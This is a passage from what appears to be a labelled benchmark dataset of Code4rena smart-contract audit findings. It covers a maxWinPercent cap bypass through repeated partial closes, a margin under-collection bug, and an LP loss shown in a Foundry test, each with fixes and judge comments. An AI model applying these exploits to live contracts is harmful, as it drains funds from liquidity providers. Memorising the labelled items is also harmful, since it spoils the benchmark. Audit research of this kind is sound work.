\\\"Users can bypass the maxWinPercent limit using a partially closing\\\"\",\n    \"line\": \"Trading[602,624]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-tigris#h-09-users-can-bypass-the-maxwinpercent-limit-using-a-partially-closing\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byhansfriese, also found by0x52,0xA5DF, andbin2chen\",\n      \"Users can bypass themaxWinPercentlimit using a partial closing.\",\n      \"As a result, users can receive more funds than their upper limit from the protocol.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"As we can see from thedocumentation, there is limitation of a maximum PnL.\",\n      \"Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\",\n      \"And this logic was implemented like below in_closePosition().\",\n      \"File:\\n2022\\n-\\n12\\n-\\ntigris\\n\\\\\\ncontracts\\n\\\\\\nTrading\\n.\\nsol\\n624\\n:\\n_toMint\\n=\\n_handleCloseFees\\n(\\n_trade\\n.\\nasset\\n,\\nuint256\\n(\\n_payout\\n)*\\n_percent\\n/\\nDIVISION_CONSTANT\\n,\\n_trade\\n.\\ntigAsset\\n,\\n_positionSize\\n*\\n_percent\\n/\\nDIVISION_CONSTANT\\n,\\n_trade\\n.\\ntrader\\n,\\n_isBot\\n);\\n625\\n:\\nif\\n(\\nmaxWinPercent\\n>\\n0\\n&&\\n_toMint\\n>\\n_trade\\n.\\nmargin\\n*\\nmaxWinPercent\\n/\\nDIVISION_CONSTANT\\n) {\\n//@audit bypass limit\\n626\\n:\\n_toMint\\n=\\n_trade\\n.\\nmargin\\n*\\nmaxWinPercent\\n/\\nDIVISION_CONSTANT\\n;\\n627\\n:                 }\",\n      \"But it checks themaxWinPercentbetween the partial payout and full margin so the below scenario is possible.\",\n      \"Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.IfmaxWinPercent= 500%, Alice should receive 500 at most.But Alice closed 50% of the position and she got 500 for a 50% margin because it checksmaxWinPercentwith_toMint = 500and_trade.margin = 100After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\"\n    ],\n    \"recommended_mitigation\": [\n      \"We should check themaxWinPercentbetween the partial payout and partial margin like below.\",\n      \"_toMint\\n=\\n_handleCloseFees\\n(\\n_trade\\n.\\nasset\\n,\\nuint256\\n(\\n_payout\\n)*\\n_percent\\n/\\nDIVISION_CONSTANT\\n,\\n_trade\\n.\\ntigAsset\\n,\\n_positionSize\\n*\\n_percent\\n/\\nDIVISION_CONSTANT\\n,\\n_trade\\n.\\ntrader\\n,\\n_isBot\\n);\\nuint256\\npartialMarginToClose\\n=\\n_trade\\n.\\nmargin\\n*\\n_percent\\n/\\nDIVISION_CONSTANT\\n;\\n//+++++++++++++++++++++++\\nif\\n(\\nmaxWinPercent\\n>\\n0\\n&&\\n_toMint\\n>\\npartialMarginToClose\\n*\\nmaxWinPercent\\n/\\nDIVISION_CONSTANT\\n) {\\n_toMint\\n=\\npartialMarginToClose\\n*\\nmaxWinPercent\\n/\\nDIVISION_CONSTANT\\n;\\n}\",\n      \"TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented:\",\n      \"I would label this as Medium risk as a +500% win is required so assets are not in a direct risk.\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The Warden has shown how, by partially closing an order, it is possible to bypass themaxWinPercentcap.Per similar discussion to#111the fact that not every trade can be above 500% in payout is not a guarantee that some trade will be, and those that will, will cause the invariant to be broken and LPs to be deeper in the red than they should.Because this causes an immediate gain to the attacker, at a loss for LPs, I agree with High Severity.\",\n      \"GainsGoblin (Tigris Trade) resolved:\",\n      \"Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176771\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 190,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 9,\n    \"bug_description\": \" \\\"Not enough margin pulled or burned from user when adding to a position\\\"\",\n    \"line\": \"Trading[255,275,278]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-tigris#h-11-not-enough-margin-pulled-or-burned-from-user-when-adding-to-a-position\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byminhtrng, also found byAymen0909,hansfriese,0Kage,Jeiwan,bin2chen,KingNFT,HollaDieWaldfee, andrvierdiiev\",\n      \"When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio oftigAsset.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.\",\n      \"While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).\",\n      \"For this reason, I believe the finding to be of High Severity.\"\n    ],\n    \"proof_of_concept\": [\n      \"In Trading.addToPosition the _handleDeposit function is called like this:\",\n\n      \",_handleDeposit(\\n_trade.tigAsset,\\n_marginAsset,\\n_addMargin - _fee,\\n_stableVault,\\n_permitData,\\n_trader\\n);\",\n      \"The third parameter with the value of _addMargin - _fee is the amount pulled (or burned in the case of using tigAsset) from the user. The _fee value is calculated as part of the position size like this:\",\n      \"uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\",\n      \"The _handleOpenFees function mints _tigAsset to the referrer, to the msg.sender (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the _addMargin value paid by the user. Hence using _addMargin - _fee as the third parameter to _handleDeposit is going to pull or burn less margin than what was accounted for.\",\n      \"An example for correct usage can be seen in initiateMarketOrder:\",\n      \"uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\\n_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\",\n      \"Here the third parameter to _handleDeposit is not _marginAfterFees but _tradeInfo.margin which is what the user has input on and is supposed to pay.\"\n    ],\n    \"recommended_mitigation\": [\n      \"In Trading.addToPosition call the _handleDeposit function without subtracting the _fee value:\",\n      \"_handleDeposit(\\n_trade.tigAsset,\\n_marginAsset,\\n_addMargin,\\n_stableVault,\\n_permitData,\\n_trader\\n);\"\n    ]\n  },\n  {\n    \"row_number\": 191,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 28,\n    \"bug_description\": \" \\\"Liquidity providers may lose funds when adding liquidity\\\"\",\n    \"line\": \"Pair[63,420,425]\",\n    \"url\": \" https://code4rena.com/reports/2022-12-caviar#h-02-liquidity-providers-may-lose-funds-when-adding-liquidity\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted byJeiwan, also found byminhtrng,minhquanym,HE1M,wait,hansfriese,BAHOZ,unforgiven,0xxm,Junnon,bytehat,UNCHAIN,carlitox477,RaymondFam,Chom,CRYP70,9svR6w,mauricio1802,__141345__,hihen,caventa,koxuan,obront,nicobevi,shung,cccz,Bobface, andchaduke\",\n      \"Liquidity providers may lose a portion of provided liquidity in either of the pair tokens. While theminLpTokenAmountprotects from slippage when adding liquidity, it doesn‚Äôt protect from providing liquidity at different K.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"ThePaircontract is designed to receive liquidity from liquidity providers (Pair.sol#L63). First liquidity provider in a pool may provide arbitrary token amounts and set the initial price (Pair.sol#L425-L426), but all other liquidity providers must provide liquidity proportionally to current pool reserves (Pair.sol#L420-L423). Since a pool is made of two tokens and liquidity is provided in both tokens, there‚Äôs a possibility for a discrepancy: token amounts may be provided in different proportions. When this happens, the smaller of the proportions is chosen to calculate the amount of LP tokens minted (Pair.sol#L420-L423):\",\n      \"// calculate amount of lp tokens as a fraction of existing reserves\\nuint256\\nbaseTokenShare\\n= (\\nbaseTokenAmount\\n*\\nlpTokenSupply\\n) /\\nbaseTokenReserves\\n();\\nuint256\\nfractionalTokenShare\\n= (\\nfractionalTokenAmount\\n*\\nlpTokenSupply\\n) /\\nfractionalTokenReserves\\n();\\nreturn\\nMath\\n.\\nmin\\n(\\nbaseTokenShare\\n,\\nfractionalTokenShare\\n);\",\n      \"As a result, the difference in proportions will create an excess of tokens that won‚Äôt be redeemable for the amount of LP tokens minted. The excess of tokens gets, basically, donated to the pool: it‚Äôll be shared among all liquidity providers of the pool. While theminLpTokenAmountargument of theaddfunction (Pair.sol#L63) allows liquidity providers to set the minimal amount of LP tokens they want to receive, it doesn‚Äôt allow them to minimize the disproportion of token amounts or avoid it at all.\",\n      \"// test/Pair/unit.Add.t.sol\\nfunction\\ntestLockOfFunds_AUDIT\\n()\\npublic\\n{\\naddress\\nalice\\n=\\naddress\\n(\\n0x31337\\n);\\naddress\\nbob\\n=\\naddress\\n(\\n0x12345\\n);\\nvm\\n.\\nlabel\\n(\\nalice\\n,\\n\\\"alice\\\"\\n);\\nvm\\n.\\nlabel\\n(\\nbob\\n,\\n\\\"bob\\\"\\n);\\ndeal\\n(\\naddress\\n(\\nusd\\n),\\nalice\\n,\\n100e18\\n,\\ntrue\\n);\\ndeal\\n(\\naddress\\n(\\nusd\\n),\\nbob\\n,\\n100e18\\n,\\ntrue\\n);\\ndeal\\n(\\naddress\\n(\\np\\n),\\nalice\\n,\\n100e18\\n,\\ntrue\\n);\\ndeal\\n(\\naddress\\n(\\np\\n),\\nbob\\n,\\n100e18\\n,\\ntrue\\n);\\n// Alice is the first liquidity provider.\\nvm\\n.\\nstartPrank\\n(\\nalice\\n);\\nusd\\n.\\napprove\\n(\\naddress\\n(\\np\\n),\\ntype\\n(\\nuint256\\n).\\nmax\\n);\\np\\n.\\nadd\\n(\\n10\\nether\\n,\\n10\\nether\\n,\\n0\\n);\\nvm\\n.\\nstopPrank\\n();\\n// Bob provides liquidity to the pool and sets the minimal LP amount.\\n// The token amounts are deposited in different proportions, thus the smaller\\n// one will be chosen to calculate the amount of LP tokens Bob will receive.\\nvm\\n.\\nstartPrank\\n(\\nbob\\n);\\nusd\\n.\\napprove\\n(\\naddress\\n(\\np\\n),\\ntype\\n(\\nuint256\\n).\\nmax\\n);\\nuint256\\nminLPAmount\\n=\\n1e18\\n;\\nuint256\\nbobLPAmount\\n=\\np\\n.\\nadd\\n(\\n1.2\\nether\\n,\\n1\\nether\\n,\\nminLPAmount\\n);\\nvm\\n.\\nstopPrank\\n();\\n// Bob has received the minimal LP amount he wanted.\\nassertEq\\n(\\nbobLPAmount\\n,\\nminLPAmount\\n);\\n// However, after removing all his liquidity from the pool...\\n(\\nuint256\\nbobUSDBefore\\n,\\nuint256\\nbobFracBefore\\n) = (\\nusd\\n.\\nbalanceOf\\n(\\nbob\\n),\\np\\n.\\nbalanceOf\\n(\\nbob\\n));\\nvm\\n.\\nprank\\n(\\nbob\\n);\\np\\n.\\nremove\\n(\\nminLPAmount\\n,\\n0\\n,\\n0\\n);\\n(\\nuint256\\nbobUSDAfter\\n,\\nuint256\\nbobFracAfter\\n) = (\\nusd\\n.\\nbalanceOf\\n(\\nbob\\n),\\np\\n.\\nbalanceOf\\n(\\nbob\\n));\\n// ... Bob received less USD than he deposited.\\nassertEq\\n(\\nbobUSDAfter\\n-\\nbobUSDBefore\\n,\\n1.018181818181818181\\nether\\n);\\nassertEq\\n(\\nbobFracAfter\\n-\\nbobFracBefore\\n,\\n1.000000000000000000\\nether\\n);\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"In theaddfunction, consider calculating optimal token amounts based on the amounts specified by user, current pool reserves, and the minimal LP tokens amount specified by user. As a reference, consider this piece from the Uniswap V2 Router:UniswapV2Router02.sol#L45-L60.\",\n      \"outdoteth (Caviar) confirmed and commented:\",\n      \"Fixed in:https://github.com/outdoteth/caviar/pull/2By allowing a user to specify aminPriceandmaxPricethat they are willing to LP at along with theminLpTokenAmountthat they would like to receive. The price calculation is based on this:https://github.com/outdoteth/caviar/blob/main/src/Pair.sol#L471\",\n      \"\"\n    ]\n  }\n]",
    "content_summary": "[\n  {\n    \"row_number\": 2,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Price feed can be manipulated\\\"\",\n    \"line\": \"PriceAware[60,111,144]\",\n    \"url\": \" https://code4rena.com/reports/2021-04-mar...",
    "content_length": 482052,
    "created_at": "2025-05-09T18:28:07.715681",
    "updated_at": "2025-05-09T23:40:19.346127",
    "file_path": "unknown_source"
  }
}